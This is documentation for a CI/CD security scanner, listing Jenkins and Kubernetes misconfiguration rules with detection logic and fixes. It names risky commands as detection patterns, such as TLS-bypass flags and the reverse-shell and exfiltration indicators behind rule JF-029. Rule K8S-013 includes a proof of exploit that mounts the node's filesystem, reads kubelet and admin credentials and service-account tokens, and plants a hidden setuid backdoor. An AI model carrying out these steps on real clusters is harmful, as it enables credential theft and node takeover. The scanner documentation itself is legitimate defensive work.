**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR pipeline (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`JF-022`](../providers/jenkins.md#jf-022) in the [Jenkins provider](../providers/jenkins.md).

### `JF-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-023 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`JF-023`](../providers/jenkins.md#jf-023) in the [Jenkins provider](../providers/jenkins.md).

### `JF-024`: `input` approval step missing submitter restriction <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-024 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment.

**How this is detected.** JF-005 already flags deploy stages with no ``input`` step. This rule catches the subtler case: the gate exists, but it doesn't actually restrict approvers. ``submitter`` accepts a comma-separated list of Jenkins usernames and group names; scope it to the smallest release-eligible pool.

**Recommendation.** Add a ``submitter: 'releasers,sre'`` (or a single role) argument to every ``input`` step in a deploy-like stage. Without it, any user with the Jenkins job ``Build`` permission can approve a production promotion, the approval gate becomes advisory.

**Source:** [`JF-024`](../providers/jenkins.md#jf-024) in the [Jenkins provider](../providers/jenkins.md).

### `JF-025`: Kubernetes agent pod template runs privileged or mounts hostPath <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-025 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** JF-017 flags inline ``docker run`` commands. This rule targets the other privileged-mode entry point: Jenkins' Kubernetes plugin lets pipelines declare ``agent { kubernetes { yaml '''...''' } }``. A pod running with ``privileged: true`` or mounting ``hostPath: /`` gives the build container the same blast radius, container escape, node-credential theft, cross-tenant contamination on a shared cluster.

**Recommendation.** Remove ``privileged: true`` from the embedded pod YAML, drop ``hostPath``/``hostNetwork``/``hostPID``/``hostIPC`` entries, and add a ``securityContext`` with ``runAsNonRoot: true`` and a ``readOnlyRootFilesystem``. If Docker-in-Docker is genuinely required, use a rootless daemon (e.g. sysbox) or run the build on a dedicated privileged pool with stricter branch protection.

**Source:** [`JF-025`](../providers/jenkins.md#jf-025) in the [Jenkins provider](../providers/jenkins.md).

### `JF-026`: `build job:` trigger ignores downstream failure <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-026 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment.

**How this is detected.** The Jenkins Pipeline plugin defaults ``wait`` to ``true`` and ``propagate`` to ``true``, but either can be flipped per call. ``wait: false`` returns immediately; ``propagate: false`` continues even when the downstream job fails or is aborted. Both patterns sever the flow-control link between the upstream approval gate and the work the downstream job is about to do.

**Recommendation.** Remove ``wait: false`` and ``propagate: false`` from every ``build job:`` step, or replace them with an explicit ``currentBuild.result = build(...).result`` check. A fire-and-forget trigger can silently ship broken artifacts because the upstream job reports success regardless of what the downstream job actually did.

**Source:** [`JF-026`](../providers/jenkins.md#jf-026) in the [Jenkins provider](../providers/jenkins.md).

### `JF-027`: `archiveArtifacts` does not record a fingerprint <span class="pg-sev pg-sev--low">LOW</span> { #detail-jf-027 }

**Evidences:** [`ESF-D-TAMPER`](#ctrl-esf-d-tamper) Protect build artifacts from tampering and detect unauthorized modification.

**How this is detected.** Fingerprinting hashes the artifact on archive so Jenkins can trace its flow between jobs, the same mechanism JF-013 relies on for verification-step pairing. It's cheap and retroactive: enabling it on the producer job unlocks a build-traceability audit for every downstream consumer.

**Recommendation.** Set ``fingerprint: true`` on every ``archiveArtifacts`` call (or use ``archiveArtifacts artifacts: '...', fingerprint: true``). Without it, Jenkins can't link the artifact to the build that produced it; ``copyArtifacts`` consumers downstream then have no provenance to verify against.

**Source:** [`JF-027`](../providers/jenkins.md#jf-027) in the [Jenkins provider](../providers/jenkins.md).

### `JF-028`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-028 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release, [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** ``cosign sign`` signs the artifact bytes. ``cosign attest`` signs an in-toto statement describing how the build ran, builder, source commit, input parameters. SLSA L3 verifiers check the latter so consumers can enforce policy on where and how artifacts were produced.

**Recommendation.** Add a ``sh 'cosign attest --predicate=provenance.intoto.jsonl …'`` step after the build, or integrate the TestifySec ``witness run`` attestor. JF-006 covers signing; this rule covers the build-provenance statement SLSA Build L3 requires.

**Source:** [`JF-028`](../providers/jenkins.md#jf-028) in the [Jenkins provider](../providers/jenkins.md).

### `JF-029`: Jenkinsfile contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-jf-029 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Distinct from JF-016 (curl pipe) and JF-019 (Groovy sandbox escape). Those flag risky defaults; this flags concrete evidence, reverse shells, base64-decoded execution, miner binaries, exfil channels, credential-dump pipes, shell-history erasure. Runs on the comment-stripped Groovy text so ``// cosign verify … // webhook.site`` in a legitimate annotation doesn't false-positive.

**Recommendation.** Treat as a potential compromise. Identify the commit that introduced the matching stage(s), rotate Jenkins credentials the job can reach, review controller/agent audit logs for outbound traffic to the matched hosts, and re-image the agent pool if the compromise may have persisted.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`JF-029`](../providers/jenkins.md#jf-029) in the [Jenkins provider](../providers/jenkins.md).

### `JF-030`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-030 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Complements JF-002 (script injection from untrusted build parameters). Fires on intrinsically risky shell idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the input source is currently trusted.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate any value feeding a dynamic command at the boundary, or pass arguments as a list to a real ``sh`` step so the shell is not re-invoked.

**Known false positives.**

- ``sh 'eval "$(ssh-agent -s)"'`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`JF-030`](../providers/jenkins.md#jf-030) in the [Jenkins provider](../providers/jenkins.md).

### `JF-031`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-031 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Complements JF-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

**Recommendation.** Pin git dependencies to a commit SHA. Publish private packages to an internal registry (Artifactory, Nexus) instead of installing from a filesystem path or tarball URL.

**Source:** [`JF-031`](../providers/jenkins.md#jf-031) in the [Jenkins provider](../providers/jenkins.md).

### `JF-032`: Agent label interpolates attacker-controllable value <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-jf-032 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** JF-014 catches agent labels that aren't ephemeral; this rule catches the upstream targeting choice. When ``label`` inside an ``agent { ... }`` block is computed from a build parameter or an SCM-controlled environment variable, whoever queues the build (or pushes the branch / opens the PR) picks which agent the job lands on, including any privileged label the controller exposes. Two attacker surfaces are flagged: untrusted ``env.*`` refs (``BRANCH_NAME``, ``CHANGE_BRANCH``, ``TAG_NAME``, …) and ``params.X`` references (caller-controlled at trigger time). The rule walks all four ``agent { ... }`` shapes, direct ``label``, the ``node { label … }`` form, and ``docker { label … }`` / ``dockerfile { label … }``, via brace-balanced scan so nested DSL blocks parse correctly.

**Recommendation.** Hard-code agent labels to a specific pool name. If label selection has to be parameterised, validate the candidate value against an explicit allowlist before the build starts (Groovy ``if`` guard at the top of the pipeline), and never inline ``${params.X}`` / ``${env.BRANCH_NAME}`` / ``${env.CHANGE_BRANCH}`` directly into ``label "..."``.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Author-controlled environment refs like ``${env.JOB_NAME}`` or ``${env.BUILD_NUMBER}`` are intentionally not flagged, those values come from Jenkins itself, not from the triggerer. Pipelines that intentionally select agents via a vetted parameter and gate the assignment behind a Groovy validator should suppress with ``.pipelinecheckignore`` and a rationale rather than disable the rule everywhere.

**Source:** [`JF-032`](../providers/jenkins.md#jf-032) in the [Jenkins provider](../providers/jenkins.md).

### `JF-033`: withCredentials secret leaked via Groovy ${...} interpolation in sh step <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-033 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** ``withCredentials([string(credentialsId: 'X', variable: 'TOKEN')])`` exposes the secret as a shell environment variable for the duration of the block. The rule fires when a ``sh`` / ``bat`` / ``powershell`` step inside that block uses a Groovy interpolation (``${TOKEN}`` or ``$TOKEN`` in a double-quoted / triple-double-quoted string) to reference the binding. Groovy substitutes the literal value before handing the resulting string to the shell, so Jenkins' secret-masking wrapper, which only sees the shell-level ``$TOKEN`` token, cannot redact the value in trace output. Single-quoted bodies (``sh '... $TOKEN'``) leave the variable for the shell to resolve at run time, which is the safe pattern.

**Recommendation.** Inside a ``withCredentials([...])`` block, reference each bound variable through the shell (single-quoted Groovy string), not through Groovy interpolation. Write ``sh 'curl -H "Authorization: Bearer $TOKEN" ...'`` instead of ``sh "curl -H 'Authorization: Bearer ${TOKEN}' ..."``. The single-quoted form keeps Jenkins' secret-masking layer in the loop, the double-quoted Groovy form bakes the literal value into the command string before the masker ever sees it, so ``set -x`` (Jenkins' default for ``sh``) prints the credential to the build log.

**Known false positives.**

- Bindings whose variable name doesn't look credential-ish (e.g. ``variable: 'COUNT'``) are still flagged: any value bound through ``withCredentials`` is a credential by definition.

**Source:** [`JF-033`](../providers/jenkins.md#jf-033) in the [Jenkins provider](../providers/jenkins.md).

### `JF-034`: Pipeline declares a password() build parameter <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-034 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Jenkins' ``password()`` parameter persists the supplied value into ``builds/<n>/build.xml`` as an encrypted ``Secret``, the same encryption the Credentials Provider uses. The encryption is keyed off the controller's master key at ``$JENKINS_HOME/secrets/master.key``, so anyone who captures both the build XML and the master key (a filesystem backup, an admin running ``thinBackup``, a compromised agent that can read controller state) recovers every password every operator has ever submitted. The build's parameters page renders the value as ``********`` for Job/Read users, but Job/Configure (or higher) can recover the encrypted string from ``config.xml`` and decrypt it. The substantive operational gap vs ``withCredentials`` is log-masking: a ``sh "deploy ${params.API_TOKEN}"`` step leaks the value to the build log because the Credentials Binding plugin's masker is what intercepts that flow, and the masker only fires for ``withCredentials`` bindings, not for ``params.*`` references. ``password()`` should be treated as a deprecated anti-pattern.

**Recommendation.** Replace ``password(name: 'X')`` with a credential binding. Store the secret in Jenkins' Credentials Provider and pull it in with ``withCredentials([string(credentialsId: 'X', variable: 'X')])``. The bound variable integrates with Jenkins' log-masking, the credential definition is decoupled from build invocation (so operators don't retype the value on every trigger), and Job/Configure on the build no longer exposes the value through ``build.xml``.

**Known false positives.**

- A pipeline that intentionally uses ``password()`` for a non-secret value (e.g. a one-off prompt for a confirmation token) is still flagged, the parameter type itself is the anti-pattern. Suppress via ``.pipelinecheckignore`` with a rationale rather than disabling the rule.

**Source:** [`JF-034`](../providers/jenkins.md#jf-034) in the [Jenkins provider](../providers/jenkins.md).

### `JF-035`: httpRequest step disables SSL verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-035 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** The HTTP Request plugin's ``ignoreSslErrors: true`` flag tells the step to accept any TLS certificate (including self-signed, expired, hostname-mismatched, and attacker-presented) when calling the configured URL. Pipelines that hit internal services with broken trust chains frequently reach for it as a shortcut; the runtime consequence is that whatever the response body feeds into (``readJSON``, ``writeFile``, an arg to a subsequent deploy step) is now attacker-controllable for anyone who can MITM the controller-to-service connection. Complements JF-023 (which catches the broader catalog of curl/wget/git TLS bypasses) — JF-035 is specific to the ``httpRequest`` plugin step Jenkins pipelines commonly use for API calls.

**Recommendation.** Drop ``ignoreSslErrors: true`` from the ``httpRequest`` step. Fix certificate trust at the source: install the internal CA into the controller's truststore, or use a properly-issued certificate on the upstream service. Disabling verification on a CI runner lets any actor on the network path between Jenkins and the target inject responses, including payloads that flow into downstream stages.

**Source:** [`JF-035`](../providers/jenkins.md#jf-035) in the [Jenkins provider](../providers/jenkins.md).

### `K8S-001`: Container image not pinned by sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-001 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Reuses ``_primitives.image_pinning.classify`` so the floating-tag semantics match DF-001 / GL-001 / JF-009 / ADO-009 / CC-003. Even a ``PINNED_TAG`` like ``nginx:1.25.4`` is treated as unpinned, only an explicit ``@sha256:`` survives, since a tag is mutable on the registry side and Kubernetes will happily pull the new content on a node restart.

**Recommendation.** Resolve every workload container image to its current digest (``crane digest <ref>`` or ``docker buildx imagetools inspect``) and pin via ``image: repo@sha256:<digest>``. Floating tags (``:latest``, ``:3``, no tag) silently swap the running image on the next rollout, breaking provenance and reproducibility.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-001`](../providers/kubernetes.md#k8s-001) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-002`: Pod hostNetwork: true <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-002 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Compromised containers on hostNetwork can sniff or interfere with traffic from every other pod on the node. Reserve the flag for system DaemonSets that genuinely require it (CNI agents, ingress data planes); applications never need it.

**Recommendation.** Set ``spec.hostNetwork: false`` (the default) on every workload. ``hostNetwork: true`` puts the pod directly on the node's network namespace, exposing every host-bound listener to the container and bypassing CNI network policies.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-002`](../providers/kubernetes.md#k8s-002) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-003`: Pod hostPID: true <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-003 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** There is no application use case for hostPID. Only specialised node agents (process exporters, debuggers) legitimately need it, and those are typically deployed via a system DaemonSet with an explicit security review.

**Recommendation.** Set ``spec.hostPID: false`` (the default) on every workload. ``hostPID: true`` makes every host process visible inside the container, and combined with privileged execution allows trivial escape via ``nsenter`` / ``/proc/<pid>/root``.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-003`](../providers/kubernetes.md#k8s-003) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-004`: Pod hostIPC: true <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-004 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Modern applications coordinate via gRPC / sockets, never via host IPC. Treat this flag as a strong red flag in code review unless paired with a documented system-level use case.

**Recommendation.** Set ``spec.hostIPC: false`` (the default) on every workload. ``hostIPC: true`` lets the container read and write the host's shared-memory segments and POSIX message queues, exposing data exchanged by every other process on the node.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-004`](../providers/kubernetes.md#k8s-004) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-005`: Container securityContext.privileged: true <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-005 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** ``privileged: true`` is the strongest possible escalation in Kubernetes. It overrides every other securityContext setting and is the single largest cluster-takeover vector after RBAC misconfiguration.

**Recommendation.** Remove ``securityContext.privileged: true`` from every container. A privileged container has full access to the host's devices and capabilities, escape to the node is trivial. If the workload genuinely needs a kernel capability, grant only that capability via ``capabilities.add`` rather than enabling privileged mode.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-005`](../providers/kubernetes.md#k8s-005) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-006`: Container allowPrivilegeEscalation not explicitly false <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-006 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** The default for non-root containers is True (Pod Security Standard 'baseline' allows this; 'restricted' does not). An explicit ``false`` is required because Kubernetes treats an unset field as a deferral to the cluster admission controller, which may not enforce ``restricted``.

**Recommendation.** Set ``securityContext.allowPrivilegeEscalation: false`` on every container. The Linux ``no_new_privs`` flag stops setuid binaries and capabilities from gaining elevated privileges, without this, a compromised process can escape via setuid utilities still installed in many base images.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-006`](../providers/kubernetes.md#k8s-006) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-007`: Container runAsNonRoot not true / runAsUser is 0 <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-007 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** A container is considered safe when EITHER its own securityContext OR the pod-level securityContext sets ``runAsNonRoot: true`` and a non-zero ``runAsUser``. An explicit ``runAsUser: 0`` always fails, even if ``runAsNonRoot`` is unset.

**Recommendation.** Set ``securityContext.runAsNonRoot: true`` and ``runAsUser: <non-zero UID>`` on every container, OR set the same fields at pod level so all containers inherit. Running as UID 0 inside a container makes container-escape exploits dramatically more dangerous, the attacker already has root inside the container, so any kernel CVE that matters becomes immediately exploitable.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-007`](../providers/kubernetes.md#k8s-007) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-008`: Container readOnlyRootFilesystem not true <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-008 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Many post-exploitation toolchains (cryptominers, persistence implants, shell-callbacks) assume a writable root. Locking it down forces the attacker to use distroless or runtime tmpfs they can't easily place.

**Recommendation.** Set ``securityContext.readOnlyRootFilesystem: true`` on every container. A read-only root filesystem stops attackers from dropping additional payloads into ``/tmp``, ``/var``, or writable system paths. Mount tmpfs ``emptyDir`` volumes for the directories the application genuinely needs to write to.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`K8S-008`](../providers/kubernetes.md#k8s-008) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-009`: Container capabilities not dropping ALL / adding dangerous caps <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-009 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Fails when the container does NOT drop ``ALL`` *or* when ``capabilities.add`` includes any of: SYS_ADMIN, NET_ADMIN, SYS_PTRACE, SYS_MODULE, DAC_READ_SEARCH, DAC_OVERRIDE, SYS_RAWIO, SYS_BOOT, BPF, PERFMON, or the literal ``ALL``.

**Recommendation.** Drop every capability and add back only what the workload actually needs:

    securityContext:
      capabilities:
        drop: ["ALL"]
        add: ["NET_BIND_SERVICE"]   # only if binding <1024

Most stateless services need no capabilities at all. Avoid ``SYS_ADMIN`` (effectively root), ``SYS_PTRACE`` (process snooping), ``NET_ADMIN`` (raw socket access), and ``SYS_MODULE`` (kernel module loading).

**Source:** [`K8S-009`](../providers/kubernetes.md#k8s-009) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-010`: Container seccompProfile not RuntimeDefault or Localhost <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-010 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Pod-level ``securityContext.seccompProfile`` covers all containers in the pod. Either path passes this rule. The default of ``Unconfined`` (or unset, which inherits the node default, usually Unconfined) fails.

**Recommendation.** Set ``securityContext.seccompProfile.type: RuntimeDefault`` (or ``Localhost`` with a path to your tuned profile) at either pod or container level. Without seccomp, every syscall is reachable from the container, modern kernel CVEs (e.g. ``io_uring``) become trivially exploitable.

**Source:** [`K8S-010`](../providers/kubernetes.md#k8s-010) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-011`: Pod serviceAccountName unset or 'default' <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-011 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** Both an unset ``serviceAccountName`` (which defaults to ``default``) and an explicit ``serviceAccountName: default`` fail the rule. Pair this with K8S-012 to also disable token auto-mounting where the workload doesn't need API access.

**Recommendation.** Bind every workload to a dedicated, narrow ``ServiceAccount``. The 'default' SA exists in every namespace and tends to accrete RoleBindings over time, using it gives the workload every privilege any other service in the namespace ever needed. Create a per-workload SA with the minimum RBAC needed and reference it via ``spec.serviceAccountName``.

**Source:** [`K8S-011`](../providers/kubernetes.md#k8s-011) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-012`: Pod automountServiceAccountToken not false <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-012 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** An unset value defaults to True in Kubernetes. This rule fails on unset because most application workloads do NOT need API access and the default exposes credentials by accident. Workloads that explicitly call the API should set the field to ``true`` so the choice is visible in code review.

**Recommendation.** Set ``spec.automountServiceAccountToken: false`` on every workload that doesn't need to talk to the Kubernetes API. Auto-mounted SA tokens are a free credential for an attacker who lands a shell, without explicit opt-out the token sits at ``/var/run/secrets/kubernetes.io/serviceaccount/token`` ready to be exfiltrated. If the workload needs API access, leave it true but pair with a tight, dedicated RBAC role.

**Source:** [`K8S-012`](../providers/kubernetes.md#k8s-012) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-013`: Pod uses a hostPath volume <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-k8s-013 }

**Evidences:** [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Some legitimate system DaemonSets need hostPath (log collectors, CSI node plugins). Those should be deployed with explicit security review and a narrow ``path:``; this rule fires regardless because *application* workloads should never use hostPath.

**Recommendation.** Replace ``hostPath`` volumes with ``configMap``, ``secret``, ``emptyDir``, ``persistentVolumeClaim``, or CSI volumes. ``hostPath`` opens a direct read/write window onto the node's filesystem; combined with even mild container compromise it gives the attacker access to other pods' data, kubelet credentials, and the container runtime.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- [CVE-2021-25741](https://www.cve.org/CVERecord?id=CVE-2021-25741) (Kubernetes subPath volume traversal): a container could craft a ``subPath`` on a volume mount to access files outside the volume boundary. The bug affected multiple volume kinds; ``hostPath`` makes the blast radius worse because the volume already references host paths, so escaping the subpath lands directly on the node filesystem with the kubelet's privileges in scope.
- TeamTNT / Kinsing crypto-jacking campaigns (2020-2022): cluster compromise reports repeatedly traced lateral movement from a single misconfigured pod to the underlying node via hostPath:/, then to kubelet credentials and other tenants. Sysdig and Aqua incident reports document the pattern.

**Proof of exploit.**

```
# Vulnerable: pod mounts the host's root filesystem.
apiVersion: v1
kind: Pod
metadata:
  name: attacker
spec:
  containers:
    - name: shell
      image: busybox
      command: ["sleep", "infinity"]
      volumeMounts:
        - name: host-root
          mountPath: /host
  volumes:
    - name: host-root
      hostPath:
        path: /            # full node filesystem

# Attack from a shell inside the container:
#
#   # Read kubelet credentials and pivot to API server:
#   cat /host/var/lib/kubelet/kubeconfig
#   cat /host/etc/kubernetes/admin.conf
#
#   # Read service account tokens for every other pod on
#   # the node and impersonate them:
#   ls /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token
#
#   # Drop a setuid binary and pin persistence on the host:
#   cp /bin/busybox /host/usr/local/bin/.bd
#   chmod 4755 /host/usr/local/bin/.bd

# Safe: use scoped volume types that don't bridge to the host.
spec:
  volumes:
    - name: data
      persistentVolumeClaim:
        claimName: app-data
```

**Source:** [`K8S-013`](../providers/kubernetes.md#k8s-013) in the [Kubernetes provider](../providers/kubernetes.md).

### `K8S-014`: Pod hostPath references a sensitive host directory <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-k8s-014 }

